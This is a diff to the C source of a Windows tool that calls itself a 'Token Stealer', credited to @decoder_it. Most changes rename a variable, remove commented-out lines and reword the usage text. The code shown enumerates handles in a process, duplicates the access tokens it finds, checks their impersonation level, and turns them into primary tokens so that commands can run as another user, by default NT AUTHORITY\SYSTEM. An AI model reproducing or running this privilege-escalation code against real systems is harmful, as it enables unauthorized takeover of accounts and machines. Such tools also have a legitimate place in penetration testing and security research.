@@ -372,7 +372,7 @@ int ExecuteWithToken(wchar_t* command, ULONG pid)
 	SECURITY_IMPERSONATION_LEVEL ImpersonationLevel;
 	
 
-	//wsprintf(desktop, L"%s\\default", WinStationName);
+	
 	ZeroMemory(&si, sizeof(STARTUPINFO));
 	si.cb = sizeof(STARTUPINFO);
 	if (!(processHandle = OpenProcess(MAXIMUM_ALLOWED, FALSE, pid)))
@@ -403,9 +403,7 @@ int ExecuteWithToken(wchar_t* command, ULONG pid)
 		SYSTEM_HANDLE handle = handleInfo->Handles[i];
 
 
-		//if (handle.ProcessId != pid)
-			//continue;
-
+	
 		if (DuplicateHandle(processHandle, (HANDLE)handle.Handle,
 			GetCurrentProcess(), &dupHandle,
 			MAXIMUM_ALLOWED, FALSE, 0x02) == FALSE)
@@ -435,13 +433,13 @@ int ExecuteWithToken(wchar_t* command, ULONG pid)
 		{
 
 
-			if (IsValidToken((HANDLE)dupHandle))// && ImpersonateLoggedOnUser(dupHandle) != 0)
+			if (IsValidToken((HANDLE)dupHandle))
 			{
 
-				int bl = TokenLevel(dupHandle, &ImpersonationLevel);
-				if (bl == -1)
+				int tl = TokenLevel(dupHandle, &ImpersonationLevel);
+				if (tl == -1)
 					continue;
-				if (TokenTypeNeeded == TOKEN_PRIMARY && bl != TOKEN_PRIMARY)
+				if (TokenTypeNeeded == TOKEN_PRIMARY && tl != TOKEN_PRIMARY)
 					continue;
 				
 				if(TokenTypeNeeded >1)
@@ -453,11 +451,11 @@ int ExecuteWithToken(wchar_t* command, ULONG pid)
 						continue;
 					}
 				}
-				if (bl == TOKEN_PRIMARY)
+				if (tl == TOKEN_PRIMARY)
 					printf("[+] Got %S Primary Token in pid: %d\n", User_to_impersonate, pid);
 				else
 					printf("[+] Got %S Impersonation Token in pid: %d with Impersonation Level: %d %s\n", User_to_impersonate, pid, ImpersonationLevel, ImpersonationLevel > 1 ? "OK" : "KO");
-				if (ImpersonationLevel > SecurityIdentification || bl == TOKEN_PRIMARY)
+				if (ImpersonationLevel > SecurityIdentification || tl == TOKEN_PRIMARY)
 				{
 					if (!DuplicateTokenEx(dupHandle, TOKEN_ALL_ACCESS, NULL, SecurityDelegation, TokenPrimary, &pToken1))
 					{
@@ -647,13 +645,13 @@ int ListTokens(ULONG pid, BOOL extended_list)
 
 		if (!wcsncmp(objectTypeInfo->Name.Buffer, L"Token", objectTypeInfo->Name.Length / 2))
 		{
-			int bl = TokenLevel(dupHandle, &ImpersonationLevel);
+			int tl = TokenLevel(dupHandle, &ImpersonationLevel);
 			
-			if (bl == -1)
+			if (tl == -1)
 				continue;
 			if (TokenTypeNeeded == TOKEN_PRIMARY)
 			{
-				if (bl != TOKEN_PRIMARY)
+				if (tl != TOKEN_PRIMARY)
 					continue;
 				
 
@@ -672,7 +670,7 @@ int ListTokens(ULONG pid, BOOL extended_list)
 			if (extended_list)
 			{
 
-					if (bl == TOKEN_PRIMARY)
+					if (tl == TOKEN_PRIMARY)
 						wsprintf((wchar_t*)SamAccountPid, L"%s:(P):%d", (wchar_t*)SamAccount, pid);
 					else
 						wsprintf((wchar_t*)SamAccountPid, L"%s:%d:%d", (wchar_t*)SamAccount, ImpersonationLevel, pid);
@@ -1186,13 +1184,12 @@ void usage()
 {
 	printf("[!] Usage:\n");
 	printf("\t -l: list all users token\n");
-	printf("\t -e: list all users token with extended info -> <user>:<token_level (2)=Impersonation, (3)=Delegation,(P)=Primary>:<pid>\n");
-	printf("\t -p: users token from specfic  process pid\n");
-	printf("\t -u: impersonate token of user <user>\n");
-	printf("\t -c: command to execute with token\n");
-	printf("\t -t: force use of impersonation Privilege\n");
-	
-	printf("\t -b: needed token type: 1=Primary,2=Impersonation,3=Delegation\n");
+	printf("\t -e: list all users token with extended info ->\n\t\t <user>:<token_level (2)=Impersonation, (3)=Delegation,(P)=Primary>:<pid>\n");
+	printf("\t -p <pid>: steal token from specfic process pid\n");
+	printf("\t -u <user>: steal token of user <user>, default NT AUTHORITY\\SYSTEM\n");
+	printf("\t -c <command>: command to execute with token\n");
+	printf("\t -t: force use of Impersonation Privilege\n");
+	printf("\t -b <token level>: needed token type: 1=Primary,2=Impersonation,3=Delegation\n");
 
 }
 int wmain(int argc, WCHAR* argv[])
@@ -1227,6 +1224,7 @@ int wmain(int argc, WCHAR* argv[])
 	BOOL extended_list = FALSE;
 	int cnt = 1;
 	printf("[+] My personal simple and stupid  Token Stealer... ;)\n");
+	printf("[+] @decoder_it 2023\n\n");
 	while ((argc > 1) && (argv[cnt][0] == '-'))
 	{
 
